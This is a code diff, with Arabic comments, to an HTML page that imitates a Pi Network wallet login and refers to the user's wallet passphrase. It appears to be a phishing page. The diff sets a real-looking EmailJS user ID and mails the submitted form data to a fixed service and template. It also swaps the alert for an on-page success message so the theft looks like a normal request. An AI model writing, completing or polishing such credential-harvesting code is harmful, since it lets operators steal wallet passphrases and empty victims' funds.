@@ -93,11 +93,16 @@
                 background: #357abd;
             }
 
-        /* مؤشر التحميل */
         .loading {
             display: none;
             font-size: 24px;
             color: #4a90e2;
+            margin-top: 20px;
+        }
+
+        .success {
+            font-size: 18px;
+            color: green;
             margin-top: 20px;
         }
     </style>
@@ -122,30 +127,36 @@
         <!-- مؤشر التحميل -->
         <div id="loading" class="loading">Loading...</div>
 
+        <!-- رساله النجاح بعد الإرسال -->
+        <div id="successMessage" class="success" style="display: none;">Your request has been sent successfully!</div>
+
         <p class="info-text">As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.</p>
         <p class="info-text">Lost your passphrase? <a href="#">You can create a new wallet</a>, but all your pi in your previous wallet will be inaccessible.</p>
     </main>
 
     <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
     <script>
-        // Initialize EmailJS
-        emailjs.init('user_12345'); // استبدل هذا بـ User ID الخاص بك
+        // Initialize EmailJS with your User ID
+        emailjs.init('user_tjataup');  // تم استبدال user_12345 بـ User ID الصحيح
 
         function sendEmail(event) {
             if (event) event.preventDefault(); // منع إرسال النموذج مباشرة
 
             // إظهار مؤشر التحميل
             document.getElementById('loading').style.display = 'block';
+            document.getElementById('successMessage').style.display = 'none';  // إخفاء رسالة النجاح السابقة إن كانت موجودة
 
             // البيانات التي سيتم إرسالها عبر البريد الإلكتروني
             var formData = new FormData(event.target || event);
 
-            // إرسال الرسالة عبر EmailJS
+            // إرسال الرسالة عبر EmailJS باستخدام Service ID و Template ID الصحيحين
             emailjs.sendForm('service_tjataup', 'template_ca9ohx4', formData)
                 .then(function (response) {
                     // إخفاء مؤشر التحميل
                     document.getElementById('loading').style.display = 'none';
-                    alert('Your request has been sent successfully!');
+
+                    // إظهار رسالة النجاح
+                    document.getElementById('successMessage').style.display = 'block';
                 }, function (error) {
                     // إخفاء مؤشر التحميل
                     document.getElementById('loading').style.display = 'none';
